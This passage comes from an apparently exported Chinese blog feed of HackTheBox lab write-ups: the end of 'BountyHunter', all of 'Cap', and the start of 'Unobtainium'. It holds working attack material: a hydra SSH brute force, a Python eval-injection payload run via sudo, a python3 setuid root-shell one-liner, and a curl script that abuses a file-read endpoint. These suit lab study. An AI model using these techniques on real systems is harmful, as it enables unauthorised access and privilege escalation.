nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin development:x:1000:1000:Development:/home/development:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin 似乎和我想的不一样啊，这里我们获取到的数据库用户名无法用来进行ssh登录，还得找找其他思路 咱们使用hydra进行爆破试试 首先将/etc/passwd的文件保存到本地 然后使用cut命令来提取用户名 cut -d : -f 1 passwd &gt; user ┌──(root💀root)-[~/Desktop] └─# cat user root daemon bin sys sync games man lp mail news uucp proxy www-data backup list irc gnats nobody systemd-network systemd-resolve systemd-timesync messagebus syslog _apt tss uuidd tcpdump landscape pollinate sshd systemd-coredump development lxd usbmux 现在就把所有的用户名都提取出来了 然后使用hydra进行爆破 ┌──(root💀root)-[~/Desktop] └─# hydra -L user -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh 255 ⨯ Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-25 14:42:27 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:34/p:1), ~3 tries per task [DATA] attacking ssh://10.10.11.100:22/ [22][ssh] host: 10.10.11.100 login: development password: m19RoAU0hP41A1sTsq6K [22][ssh] host: 10.10.11.100 login: development password: m19RoAU0hP41A1sTsq6K 1 of 1 target successfully completed, 2 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-25 14:42:44 然后确定了账号密码 username = development password = m19RoAU0hP41A1sTsq6K 咱们使用ssh进行登录 ┌──(root💀root)-[~/Desktop] └─# ssh development@10.10.11.100 development@10.10.11.100&#39;s password: Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun 25 Jul 2021 06:57:17 AM UTC System load: 0.0 Usage of /: 24.3% of 6.83GB Memory usage: 15% Swap usage: 0% Processes: 216 Users logged in: 1 IPv4 address for eth0: 10.10.11.100 IPv6 address for eth0: dead:beef::250:56ff:feb9:7ae5 0 updates can be applied immediately. Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sun Jul 25 04:44:41 2021 from 10.10.14.17 development@bountyhunter:~$ whoami &amp;&amp; id development uid=1000(development) gid=1000(development) groups=1000(development) 成功getshell development@bountyhunter:~$ cat user.txt 12df9cbc3e04ef498fad5cdd101563b4 成功拿到user权限的flag ## 权限提升 咱们使用sudo -l查看一下权限 development@bountyhunter:~$ sudo -l Matching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User development may run the following commands on bountyhunter: (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py 咱们可以利用/usr/bin/python3.8使用root权限无密码运行/opt/skytrain_inc/ticketValidator.py文件 咱们查看一下这个文件 development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py #Skytrain Inc Ticket Validation System 0.1 #Do not distribute this file. def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit() def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line = None for i,x in enumerate(ticketFile.readlines()): if i == 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line = i+1 continue if code_line and i == code_line: if not x.startswith(&quot;**&quot;): return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 == 4: validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return False def main(): fileName = input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket = load_file(fileName) #DEBUG print(ticket) result = evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.close main() 通过解读这个python脚本，我们得知，这个脚本要求我们输入文件名，且文件名要以.md为结尾。如果条件满足，则脚本打开文件并搜索下一个条件。 for i,x in enumerate(ticketFile.readlines()): if i == 0: # if line number 0 not startwith &quot;# Skytrain Inc&quot;, Quit, else Continue if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i == 1: if line number 1 Exist and not startwith &quot;## Ticket to &quot; , Quit else Continue if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): # This is line number 2, as the previous statements are all returned out or continued to here. so line number 2 should be: &quot;__Ticket Code:__&quot; code_line = i+1 continue if code_line and i == code_line: # if code_line exist if not x.startswith(&quot;**&quot;): # if code_line not startwith **, Exit! return False ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] # Remove ** from Code Line, and split at pos 0 where + is found. example is: **102+, would become just 102 if int(ticketCode) % 7 == 4: # the tricky part! validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) # this is confusing! that is the catch, the code does not eval the splitted ticketCode, but actually the line itself just without any **. so you should just pass a line of code that would work. 那咱们编写一个.md文件让他满足条件即可 # Skytrain Inc ## Ticket to __Ticket Code:__ **102+ 10 == 112 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;) == False 咱们运行一下 development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py Please enter the path to the ticket file. lucifiel.md Destination: b320161d15bd03095cb66d05ac6d4ddf Invalid ticket. 成功获得root权限的flag文件","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Cap - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Cap","date":"2021-07-17T11:38:36.000Z","updated":"2023-06-13T03:42:02.000Z","comments":true,"path":"2021/07/17/Hackthebox/Easy/Hackthebox-Cap/","link":"","permalink":"http://www.lucifiel.com/2021/07/17/Hackthebox/Easy/Hackthebox-Cap/","excerpt":"","text":"Hackthebox - CapHackTheBox在凌晨三点发布了一个新的靶场，在漫长的等待之后，靶机上线了，第一时间访问，开干 连接vpn之后打开站点 一度以为复制错了ip。。。。。。查看信息之后发现Security Snapshot(5 Second PCAP + Analysis) 为数据包可下载 果断下载之后用wireshark打开 ？？？空白，这怕是下载了个假的，和朋友确认后发现是因为还没有产生数据包，刷新之后 哦吼，产生了数据包，下载打开 数据包没发现有用的信息，但下载的数据包命名和网址后缀的数字相同引起了注意， 既然相同且刷新之后回生成新的，那么便可以尝试修改，果断改成0， 果然，有了信息，下载之后再次用wireshark打开 这不就有了吗，查看数据包，成功找到账号密码 由于数据包是ftp的，直接尝试登录ftp 成功登录ftp，拿到普通用户flag。扫描端口得知开启21、22、80端口 尝试用该账号密码登录ssh 成功拿到普通用户权限，开始提权拿到root权限，sudo –l 该用户不能在这台靶机上sudo，脑阔疼，接着找其他信息，在尝试过suid提权，本地提权，内核提权均无果后，抽了根烟，找一些提权相关的文章 第二天在朋友的帮助下利用python3提权，使用python3 -c ‘import os; os.setuid(0); os.system(“&#x2F;bin&#x2F;sh”)’命令 可以看到已经获得到root权限，find搜索一下存在的关于root的目录，看到&#x2F;root 进到root目录看到root.txt，拿到root权限的flag 提交，完活 注意： 1、关注url的变化，里面可能存在某些信息 2、分析流量包，找寻关键信息 3、思维扩散，找寻可能存在可利用的点","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Unobtainium - Hackthebox","slug":"Hackthebox/Hard/Hackthebox-Unobtanium","date":"2021-07-17T11:38:36.000Z","updated":"2023-06-13T03:54:32.000Z","comments":true,"path":"2021/07/17/Hackthebox/Hard/Hackthebox-Unobtanium/","link":"","permalink":"http://www.lucifiel.com/2021/07/17/Hackthebox/Hard/Hackthebox-Unobtanium/","excerpt":"","text":"Hackthebox - UnobtainiumHackthebox - Unobtainium 靶场实战靶场信息 靶场类型 信息搜集 首先使用nmap进行端口扫描┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.235 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-15 22:08 CST Nmap scan report for 10.10.10.235 Host is up (0.27s latency). Not shown: 65527 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA) | 256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA) |_ 256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Unobtainium 2379/tcp open ssl/etcd-client? | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2021-01-17T07:10:30 |_Not valid after: 2022-01-17T07:10:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ h2 | tls-nextprotoneg: |_ h2 2380/tcp open ssl/etcd-server? | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2021-01-17T07:10:30 |_Not valid after: 2022-01-17T07:10:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ h2 | tls-nextprotoneg: |_ h2 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 15 Jul 2021 14:50:44 GMT | Content-Length: 212 | {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/nice ports,/Trinity.txt.bak&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403} | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 15 Jul 2021 14:50:42 GMT | Content-Length: 185 | {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot get path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403} | HTTPOptions: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 15 Jul 2021 14:50:43 GMT | Content-Length: 189 |_ {&quot;kind&quot;:&quot;Status&quot;,&quot;apiVersion&quot;:&quot;v1&quot;,&quot;metadata&quot;:{},&quot;status&quot;:&quot;Failure&quot;,&quot;message&quot;:&quot;forbidden: User &quot;system:anonymous&quot; cannot options path &quot;/&quot;&quot;,&quot;reason&quot;:&quot;Forbidden&quot;,&quot;details&quot;:{},&quot;code&quot;:403} |_http-title: Site doesn&#39;t have a title (application/json). | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2021-07-14T05:10:38 |_Not valid after: 2022-07-15T05:10:38 |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=unobtainium@1610865428 | Subject Alternative Name: DNS:unobtainium | Not valid before: 2021-01-17T05:37:08 |_Not valid after: 2022-01-17T05:37:08 |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn&#39;t have a title (text/plain; charset=utf-8). 31337/tcp open http Node.js Express framework | http-methods: |_ Potentially risky methods: PUT DELETE |_http-title: Site doesn&#39;t have a title (application/json; charset=utf-8). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8443-TCP:V=7.91%T=SSL%I=7%D=7/15%Time=60F04857%P=x86_64-pc-linux-gn SF:u%r(GetRequest,1FF,&quot;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-Control:\\x20 SF:no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\nX-Content- SF:Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x203082aa7f SF:-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20c SF:4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Thu,\\x2015\\x20Jul\\x2020 SF:21\\x2014:50:42\\x20GMT\\r\\nContent-Length:\\x20185\\r\\n\\r\\n{\\&quot;kind\\&quot;:\\&quot;Stat SF:us\\&quot;,\\&quot;apiVersion\\&quot;:\\&quot;v1\\&quot;,\\&quot;metadata\\&quot;:{},\\&quot;status\\&quot;:\\&quot;Failure\\&quot;,\\&quot;mes SF:sage\\&quot;:\\&quot;forbidden:\\x20User\\x20\\\\\\&quot;system:anonymous\\\\\\&quot;\\x20cannot\\x20ge SF:t\\x20path\\x20\\\\\\&quot;/\\\\\\&quot;\\&quot;,\\&quot;reason\\&quot;:\\&quot;Forbidden\\&quot;,\\&quot;details\\&quot;:{},\\&quot;code SF:\\&quot;:403}\\n&quot;)%r(HTTPOptions,203,&quot;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nCache-C SF:ontrol:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x20application/json\\r\\ SF:nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\ SF:x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kubernetes-Pf-Priorityleve SF:l-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\nDate:\\x20Thu,\\x2015\\x SF:20Jul\\x202021\\x2014:50:43\\x20GMT\\r\\nContent-Length:\\x20189\\r\\n\\r\\n{\\&quot;ki SF:nd\\&quot;:\\&quot;Status\\&quot;,\\&quot;apiVersion\\&quot;:\\&quot;v1\\&quot;,\\&quot;metadata\\&quot;:{},\\&quot;status\\&quot;:\\&quot;Fail SF:ure\\&quot;,\\&quot;message\\&quot;:\\&quot;forbidden:\\x20User\\x20\\\\\\&quot;system:anonymous\\\\\\&quot;\\x20c SF:annot\\x20options\\x20path\\x20\\\\\\&quot;/\\\\\\&quot;\\&quot;,\\&quot;reason\\&quot;:\\&quot;Forbidden\\&quot;,\\&quot;deta SF:ils\\&quot;:{},\\&quot;code\\&quot;:403}\\n&quot;)%r(FourOhFourRequest,21A,&quot;HTTP/1\\.0\\x20403\\x2 SF:0Forbidden\\r\\nCache-Control:\\x20no-cache,\\x20private\\r\\nContent-Type:\\x SF:20application/json\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nX-Kubernete SF:s-Pf-Flowschema-Uid:\\x203082aa7f-e4b1-444a-a726-829587cd9e39\\r\\nX-Kuber SF:netes-Pf-Prioritylevel-Uid:\\x20c4131e14-5fda-4a46-8349-09ccbed9efdd\\r\\n SF:Date:\\x20Thu,\\x2015\\x20Jul\\x202021\\x2014:50:44\\x20GMT\\r\\nContent-Length SF::\\x20212\\r\\n\\r\\n{\\&quot;kind\\&quot;:\\&quot;Status\\&quot;,\\&quot;apiVersion\\&quot;:\\&quot;v1\\&quot;,\\&quot;metadata\\&quot; SF::{},\\&quot;status\\&quot;:\\&quot;Failure\\&quot;,\\&quot;message\\&quot;:\\&quot;forbidden:\\x20User\\x20\\\\\\&quot;syst SF:em:anonymous\\\\\\&quot;\\x20cannot\\x20get\\x20path\\x20\\\\\\&quot;/nice\\x20ports,/Trinit SF:y\\.txt\\.bak\\\\\\&quot;\\&quot;,\\&quot;reason\\&quot;:\\&quot;Forbidden\\&quot;,\\&quot;details\\&quot;:{},\\&quot;code\\&quot;:403} SF:\\n&quot;)%r(GenericLines,67,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-T SF:ype:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400 SF:\\x20Bad\\x20Request&quot;); No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=7/15%OT=22%CT=1%CU=43753%PV=Y%DS=2%DC=T%G=Y%TM=60F048D OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1 OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N% OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD OS:=S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 1025/tcp) HOP RTT ADDRESS 1 271.92 ms 10.10.14.1 2 271.99 ms 10.10.10.235 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1914.83 seconds 从上面的扫描结果，我们可以得到几个关键信息 - 本台靶机开启了22，80，2379，2380，8443，10250，10256，31337端口 - 其中80，2379，2380，8443，10250，10256，31337都是http服务 - 8443端口给出了两个关键信息 /nice /Trinity.txt.bak - 31337端口存在PUT和DELETE风险 咱们先去80端口看看 http://10.10.10.235/ 它声称这是一个聊天程序，并给了三个下载地址，咱们给它下载下来，同时FUZZ一下目录 ┌──(root💀root)-[~/Desktop] └─# gobuster dir -u http://10.10.10.235 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 200 =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.235 [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Extensions: txt,php,html [+] Timeout: 10s =============================================================== 2021/07/16 16:33:21 Starting gobuster in directory enumeration mode =============================================================== /.htpasswd.php (Status: 403) [Size: 277] /.hta (Status: 403) [Size: 277] /.htaccess (Status: 403) [Size: 277] /.htpasswd.html (Status: 403) [Size: 277] /.hta.txt (Status: 403) [Size: 277] /.htaccess.php (Status: 403) [Size: 277] /.htpasswd.txt (Status: 403) [Size: 277] /.hta.php (Status: 403) [Size: 277] /.htaccess.html (Status: 403) [Size: 277] /.htaccess.txt (Status: 403) [Size: 277] /.htpasswd (Status: 403) [Size: 277] /.hta.html (Status: 403) [Size: 277] /LICENSE.txt (Status: 200) [Size: 17128] /README.txt (Status: 200) [Size: 711] /assets (Status: 301) [Size: 313] [--&gt; http://10.10.10.235/assets/] /downloads (Status: 301) [Size: 316] [--&gt; http://10.10.10.235/downloads/] /index.html (Status: 200) [Size: 1988] /index.html (Status: 200) [Size: 1988] /images (Status: 301) [Size: 313] [--&gt; http://10.10.10.235/images/] /server-status (Status: 403) [Size: 277] =============================================================== 2021/07/16 16:33:58 Finished =============================================================== 当fuzz完的时候，三个文件也下载完了，咱们去看一下 ┌──(root💀root)-[~/Downloads] └─# ls unobtainium_debian.zip unobtainium_redhat.zip unobtainium_snap.zip 让我们提取deb包中的文件，而不安装它 mkdir test unzip unobtainium_debian.zip dpkg-deb -xv unobtainium_1.0.0_amd64.deb test cd test ┌──(root💀root)-[~/Downloads/test] └─# tree . ├── opt │ └── unobtainium │ ├── chrome_100_percent.pak │ ├── chrome_200_percent.pak │ ├── chrome-sandbox │ ├── icudtl.dat │ ├── libEGL.so │ ├── libffmpeg.so │ ├── libGLESv2.so │ ├── libvk_swiftshader.so │ ├── libvulkan.so │ ├── LICENSE.electron.txt │ ├── LICENSES.chromium.html │ ├── locales │ │ ├── am.pak │ │ ├── ar.pak │ │ ├── bg.pak │ │ ├── bn.pak │ │ ├── ca.pak │ │ ├── cs.pak │ │ ├── da.pak │ │ ├── de.pak │ │ ├── el.pak │ │ ├── en-GB.pak │ │ ├── en-US.pak │ │ ├── es-419.pak │ │ ├── es.pak │ │ ├── et.pak │ │ ├── fa.pak │ │ ├── fil.pak │ │ ├── fi.pak │ │ ├── fr.pak │ │ ├── gu.pak │ │ ├── he.pak │ │ ├── hi.pak │ │ ├── hr.pak │ │ ├── hu.pak │ │ ├── id.pak │ │ ├── it.pak │ │ ├── ja.pak │ │ ├── kn.pak │ │ ├── ko.pak │ │ ├── lt.pak │ │ ├── lv.pak │ │ ├── ml.pak │ │ ├── mr.pak │ │ ├── ms.pak │ │ ├── nb.pak │ │ ├── nl.pak │ │ ├── pl.pak │ │ ├── pt-BR.pak │ │ ├── pt-PT.pak │ │ ├── ro.pak │ │ ├── ru.pak │ │ ├── sk.pak │ │ ├── sl.pak │ │ ├── sr.pak │ │ ├── sv.pak │ │ ├── sw.pak │ │ ├── ta.pak │ │ ├── te.pak │ │ ├── th.pak │ │ ├── tr.pak │ │ ├── uk.pak │ │ ├── vi.pak │ │ ├── zh-CN.pak │ │ └── zh-TW.pak │ ├── resources │ │ └── app.asar │ ├── resources.pak │ ├── snapshot_blob.bin │ ├── swiftshader │ │ ├── libEGL.so │ │ └── libGLESv2.so │ ├── unobtainium │ ├── v8_context_snapshot.bin │ └── vk_swiftshader_icd.json └── usr └── share ├── applications │ └── unobtainium.desktop ├── doc │ └── unobtainium │ └── changelog.gz └── icons └── hicolor ├── 128x128 │ └── apps │ └── unobtainium.png ├── 16x16 │ └── apps │ └── unobtainium.png ├── 256x256 │ └── apps │ └── unobtainium.png ├── 32x32 │ └── apps │ └── unobtainium.png ├── 48x48 │ └── apps │ └── unobtainium.png └── 64x64 └── apps └── unobtainium.png 24 directories, 80 files 在/test/opt/unobtainium中，有一个名为unobtainium的可执行文件，让我们执行它 ./unobtainium --no-sandbox 得到了错误 让我们添加一下域名 echo 10.10.10.235 unobtainium.htb &gt;&gt; /etc/hosts 然后再执行一次 这次运行正常了 当我使用Wireshark监听tun0的时候，在Unobtainium Chat中点击Todo即可捕捉到流量包 POST /todo HTTP/1.1 Host: unobtainium.htb:31337 Connection: keep-alive Content-Length: 73 Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) unobtainium/1.0.0 Chrome/87.0.4280.141 Electron/11.2.0 Safari/537.36 Content-Type: application/json Accept-Encoding: gzip, deflate Accept-Language: zh-CN {&quot;auth&quot;:{&quot;name&quot;:&quot;felamos&quot;,&quot;password&quot;:&quot;Winter2021&quot;},&quot;filename&quot;:&quot;todo.txt&quot;}HTTP/1.1 200 OK X-Powered-By: Express Content-Type: application/json; charset=utf-8 Content-Length: 293 ETag: W/&quot;125-tNs2+nU0UiQGmLreBy4Pj891aVA&quot; Date: Fri, 16 Jul 2021 09:49:16 GMT Connection: keep-alive Keep-Alive: timeout=5 {&quot;ok&quot;:true,&quot;content&quot;:&quot;1. Create administrator zone.\\n2. Update node JS API Server.\\n3. Add Login functionality.\\n4. Complete Get Messages feature.\\n5. Complete ToDo feature.\\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\\n7. Improve security\\n&quot;} 似乎Todo函数具有从服务器读取文件的能力。 我找到一个脚本来检查是否可以从服务器读取文件。 我还运行了Burp来捕获请求 ## 漏洞利用 在运行脚本之前，我们需要安装需要的环境 apt-get install jq #!/bin/bash RHOST=&quot;unobtainium.htb&quot; RPORT=31337 UA=&quot;Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0&quot; PROXY=&quot;127.0.0.1:8080&quot; FILE=$1 cat - &lt;&lt;EOF &gt; message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;filename&quot;:&quot;${FILE}&quot; } EOF CONTENT=&quot;$(curl -s \\ -A &quot;${UA}&quot; \\ -H &quot;Content-Type: application/json&quot; \\ -d &quot;$(cat message.json | jq -c)&quot; \\ -x &quot;${PROXY}&quot; \\ http://${RHOST}:${RPORT}/todo \\ | jq .content \\ | sed -e &#39;s/^.//&#39; -e &#39;s/.$//&#39;)&quot; printf &quot;$CONTENT&quot; ┌──(root💀root)-[~/Desktop] └─# ./read.sh ┌──(root💀root)-[~/Desktop] └─# cat message.json { &quot;auth&quot;: { &quot;name&quot;:&quot;felamos&quot;, &quot;password&quot;:&quot;Winter2021&quot; }, &quot;filename&quot;:&quot;&quot; } 咱们使用burp捕捉一下流量试试 成功让我们查看一下 index.js 的内容 {&quot;ok&quot;:true,&quot;content&quot;:&quot;var root = require(\\&quot;google-cloudstorage-commands\\&quot;);\\nconst express = require(&#39;express&#39;);\\nconst { exec } = require(\\&quot;child_process\\&quot;); \\nconst bodyParser = require(&#39;body-parser&#39;); \\nconst _ = require(&#39;lodash&#39;); \\nconst app = express();\\nvar fs = require(&#39;fs&#39;);\\n \\nconst users = [ \\n {name: &#39;felamos&#39;, password: &#39;Winter2021&#39;},\\n {name: &#39;admin&#39;, password: Math.random().toString(32), canDelete: true, canUpload: true}, \\n];\\n\\nlet messages = []; \\nlet lastId = 1; \\n \\nfunction findUser(auth) { \\n return users.find((u) =&gt; \\n u.name === auth.name &amp;&amp; \\n u.password === auth.password); \\n} \\n \\napp.use(bodyParser.json()); \\n \\napp.get(&#39;/&#39;, (req, res) =&gt; { \\n res.send(messages); \\n}); \\n \\napp.put(&#39;/&#39;, (req, res) =&gt; { \\n const user = findUser(req.body.auth || {}); \\n \\n if (!user) { \\n res.status(403).send({ok: false, error: &#39;Access denied&#39;}); \\n return;\\n }\\n\\n const message = {\\n icon: &#39;__&#39;,\\n 